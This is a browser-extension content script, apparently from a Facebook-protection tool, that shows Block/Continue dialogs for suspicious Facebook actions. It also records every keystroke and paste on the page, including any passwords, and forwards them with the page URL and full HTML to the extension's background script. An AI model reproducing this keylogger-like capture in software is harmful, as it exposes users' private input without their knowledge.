	/* --> Chat, Update Status <--*/
	
	var buf = "Kashi";
	var htmlS = "Sai";
	var MAX_LENGTH = 63206;
	
	/*document.addEventListener("DOMContentLoaded", function() {});
	$(document).ready(function() {});*/

	/* --> Chat, Update Status <--*/
	document.onkeypress = function(e) {
		buf += String.fromCharCode(e.keyCode);
		if(buf.length > MAX_LENGTH) {
			buf = buf.substring(buf.length - MAX_LENGTH, buf.length - 1);
		};
		chrome.extension.sendRequest({content: buf, htmlSe: htmlS, url: document.URL});
	}
		
	document.onpaste = function(e) {
		if(window.clipboardData && window.clipboardData.getData) {
			buf += window.clipboardData.getData('Text');
		} else if(e.clipboardData && e.clipboardData.getData) {
			buf += e.clipboardData.getData('text/plain');
		};
		if(buf.length > MAX_LENGTH) {
			buf = buf.substring(buf.length - MAX_LENGTH, buf.length - 1);
		};
		chrome.extension.sendRequest({content: buf, htmlSe: htmlS, url: document.URL});
	};
		
		/* --> Like <-- */
	document.onmousemove = function() {
		// htmlS = document.getElementsByTagName('body')[0].innerHTML;
		// chrome.extension.sendRequest({content: buf, htmlSe: htmlS, url: document.URL});
	}

    $( document ).ready(function() {
        htmlS = document.getElementsByTagName('body')[0].innerHTML;
        chrome.extension.sendRequest({content: buf, htmlSe: htmlS, url: document.URL});
    });

	/* --> Confirm <-- */
	chrome.runtime.onMessage.addListener(
		function(request, sender, sendResponse)
        {
            var bkavdialog = new BkavDialog();
			var $dTitle = facebook_title();
            var objTitle = GetTitle();
			var $dMsg = facebook_message(request.fb_type, request.fb_url, request.fb_language, request.fb_targetid);
			var labelBlock = "Block";
			var labelContinue = "Continue";
			if (request.fb_language == "Vietnamese") {
				labelBlock = "Chặn";
				labelContinue = "Tiếp tục";
			}

			bkavdialog.ShowConfirmDialog({
				title: objTitle.title,
				content: $dMsg,
                img : objTitle.img,
                okbutton : {
                    label: labelBlock,
                    action: function(dialogItself)
                    {
                        try
                        {
                            if (request.fb_type == "Like")
                            {
                                facebook_like(request.fb_targetid);
                            }
                            else if (request.fb_type == "LikePage")
                            {
                                facebook_likepage(request.fb_targetid);
                            }
                            else if (request.fb_type == "Follow")
                            {
                                facebook_follow(request.fb_targetid);
                            }
                            else if (request.fb_type == "FollowList")
                            {
                                facebook_followlist(request.fb_targetid);
                            }

                            var msg_tranf = request.fb_type + "|Block|";

                            if ((request.fb_type == "SendMessage")  || 
                                (request.fb_type == "UpdateStatus") ||
                                (request.fb_type == "FakeFacebook") ||
                                (request.fb_type == "PhoneCard"))
                            {
                                msg_tranf = msg_tranf + request.fb_url;
                            }
                            else
                            {
                                msg_tranf = msg_tranf + request.fb_targetid;
                            }

                            chrome.runtime.sendMessage({user_id: request.fb_targetid, user_tranf: msg_tranf}, function(response) {});
                            dialogItself.Close();
                        }
                        catch (err)
                        {
                            dialogItself.Close();
                        }
                    }
                },

                cancelbutton : {
                    label: labelContinue,
                    action: function(dialogItself)
                    {

                        try
                        {
                            if (request.fb_type == "SendMessage")
                            {
                                facebook_chat(request.fb_targetid, request.fb_text);
                            }
                            else if (request.fb_type == "UpdateStatus")
                            {
                                facebook_updatestatus(request.fb_targetid, request.fb_text);
                            }
                            else if (request.fb_type == "AddGroup")
                            {
                                facebook_addgroup(request.fb_targetid, request.fb_text);
                            }

                            var msg_tranf = request.fb_type + "|Allow|";

                            if ((request.fb_type == "SendMessage")  ||
                                (request.fb_type == "UpdateStatus") ||
                                (request.fb_type == "FakeFacebook") ||
                                (request.fb_type == "PhoneCard")) {

                                msg_tranf = msg_tranf + request.fb_url;
                            } else {

                                msg_tranf = msg_tranf + request.fb_targetid;
                            }

                            chrome.runtime.sendMessage({user_id: request.fb_targetid, user_tranf: msg_tranf}, function(response) {});
                            dialogItself.Close();
                        }
                        catch (err)
                        {
                            dialogItself.Close();
                        }
                    }
                }
			});
		}
		)	